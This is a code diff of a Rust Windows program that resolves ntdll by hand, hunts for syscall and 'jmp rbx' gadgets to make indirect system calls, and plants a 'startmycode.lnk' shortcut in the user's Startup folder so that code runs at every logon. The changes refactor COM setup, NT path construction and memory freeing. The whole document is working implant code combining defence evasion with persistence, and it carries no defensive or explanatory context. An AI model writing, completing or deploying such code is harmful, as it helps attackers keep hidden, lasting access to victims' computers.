@@ -12,7 +12,7 @@ use std::ffi::c_void;
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING, GENERIC_WRITE, S_OK};
 use windows_sys::Win32::Storage::FileSystem::{FILE_ATTRIBUTE_NORMAL};
 use windows_sys::Win32::System::Com::{
-    CoInitialize, CoCreateInstance, CLSCTX_ALL,
+    CoInitializeEx, CoCreateInstance, CLSCTX_ALL, COINIT_MULTITHREADED,
     IStream, CoTaskMemFree,
 };
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
@@ -152,14 +152,6 @@ const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
 const SYNCHRONIZE: u32 = 0x00100000;
 
-fn to_nt_path(path_wide: &[u16]) -> Vec<u16> {
-    let mut nt_path = "\\??\\".encode_utf16().collect::<Vec<u16>>();
-    let len = path_wide.iter().position(|&c| c == 0).unwrap_or(path_wide.len());
-    nt_path.extend_from_slice(&path_wide[..len]);
-    nt_path.push(0);
-    nt_path
-}
-
 fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
     let len = (buffer.len() - 1) * 2;
     UNICODE_STRING {
@@ -171,7 +163,8 @@ fn create_unicode_string(buffer: &[u16]) -> UNICODE_STRING {
 
 fn main() {
     unsafe {
-        CoInitialize(null_mut());
+        // Initialize COM early
+        CoInitializeEx(null_mut(), COINIT_MULTITHREADED as u32);
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
@@ -201,6 +194,7 @@ fn main() {
         if syscall_gadget.is_null() || jmp_rbx_gadget.is_null() { return; }
 
         let mut path_ptr: *mut u16 = null_mut();
+        // Use KF_FLAG_CREATE to ensure folder exists
         if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
             return;
         }
@@ -209,17 +203,16 @@ fn main() {
         while *path_ptr.add(i) != 0 { i += 1; }
         let path_slice = std::slice::from_raw_parts(path_ptr, i);
 
-        let mut full_path_wide = path_slice.to_vec();
+        let mut full_path_wide = Vec::new();
+        full_path_wide.extend("\\??\\".encode_utf16());
+        full_path_wide.extend_from_slice(path_slice);
         if !full_path_wide.is_empty() && full_path_wide[full_path_wide.len()-1] != '\\' as u16 {
             full_path_wide.push('\\' as u16);
         }
         full_path_wide.extend("startmycode.lnk".encode_utf16());
         full_path_wide.push(0);
 
-        let nt_startup_path = to_nt_path(&full_path_wide);
-        let unicode_startup = create_unicode_string(&nt_startup_path);
-
-        CoTaskMemFree(path_ptr as *const _);
+        let unicode_startup = create_unicode_string(&full_path_wide);
 
         let mut shell_link_ptr: *mut c_void = null_mut();
         if CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr) == S_OK {
@@ -308,5 +301,6 @@ fn main() {
             let shell_unknown_vtbl = *(shell_link_ptr as *mut *mut IUnknownVtbl);
             ((*shell_unknown_vtbl).Release)(shell_link_ptr);
         }
+        CoTaskMemFree(path_ptr as *const _);
     }
 }
